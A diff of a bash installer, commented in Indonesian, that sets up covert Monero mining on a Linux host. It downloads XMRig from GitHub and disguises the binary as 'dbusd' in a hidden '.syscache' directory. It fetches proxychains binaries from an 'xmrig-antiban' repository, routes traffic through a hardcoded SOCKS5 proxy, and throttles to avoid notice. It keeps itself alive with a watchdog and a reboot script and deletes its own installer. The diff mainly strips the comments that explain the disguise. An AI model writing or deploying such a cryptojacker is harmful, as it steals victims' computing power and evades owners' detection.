@@ -3,20 +3,19 @@ set -e
 
 # === KONFIGURASI ===
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-REVERSE_DOMAIN="vheler.cfd"     # Ganti dengan domain reverse proxy milikmu
-REVERSE_PORT="9933"                  # Port umum HTTPS agar tidak terdeteksi
+REVERSE_DOMAIN="vheler.cfd"
+REVERSE_PORT="9933"
 WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)"
 DIR="$HOME/.syscache"
 
 mkdir -p "$DIR" && cd "$DIR"
 
-# === UNDUH XMRIG DAN SAMARKAN ===
+# === UNDUH XMRIG DAN GANTI NAMA ===
 XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
 curl -sLo miner.tar.gz "$XMRIG_URL"
 tar -xzf miner.tar.gz --strip-components=1
 rm -f miner.tar.gz
 mv xmrig dbusd
-strip --strip-unneeded dbusd
 chmod +x dbusd
 
 # === KONFIG XMRIG ===
@@ -37,7 +36,7 @@ cat > config.json <<EOF
 }
 EOF
 
-# === PROXYCHAINS (JIKA DIPAKAI) ===
+# === UNDUH PROXYCHAINS ===
 curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
 curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
 chmod +x proxychains libproxychains.so.4
@@ -52,7 +51,7 @@ tcp_connect_time_out 8000
 socks5 116.100.220.220 1080
 EOF
 
-# === LAUNCHER SH (anti suspend & pause saat CPU tinggi) ===
+# === LAUNCHER ===
 cat > launcher.sh <<'EOF'
 #!/bin/bash
 DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -63,8 +62,8 @@ while true; do
     echo "[*] CPU tinggi ($CPU_INT%), pause 30 detik..."
     sleep 30
   else
-    LD_PRELOAD="$DIR/libproxychains.so.4" \\
-    PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf" \\
+    LD_PRELOAD="$DIR/libproxychains.so.4" \
+    PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf" \
     "$DIR/dbusd" --config="$DIR/config.json" >/dev/null 2>&1
   fi
   sleep 5
@@ -72,7 +71,7 @@ done
 EOF
 chmod +x launcher.sh
 
-# === WATCHDOG (jaga agar launcher tetap hidup) ===
+# === WATCHDOG ===
 cat > watchdog.sh <<'EOF'
 #!/bin/bash
 DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -89,10 +88,9 @@ chmod +x watchdog.sh
 nohup ./launcher.sh >/dev/null 2>&1 &
 nohup ./watchdog.sh >/dev/null 2>&1 &
 
-# === SIMPAN AUTOJALAN (tanpa crontab) ===
+# === AUTOJALAN (tanpa crontab) ===
 echo -e '#!/bin/bash\\ncd '$DIR'\\nnohup ./launcher.sh >/dev/null 2>&1 &' > $HOME/.reboot.sh
 chmod +x $HOME/.reboot.sh
 
-# === HAPUS JEJAK DIRI ===
 (sleep 10 && rm -f install.sh) &
-echo "[✓] Mining stealth telah aktif via reverse TLS dan watchdog."
+echo "[✓] Mining stealth aktif tanpa strip & tanpa Java."
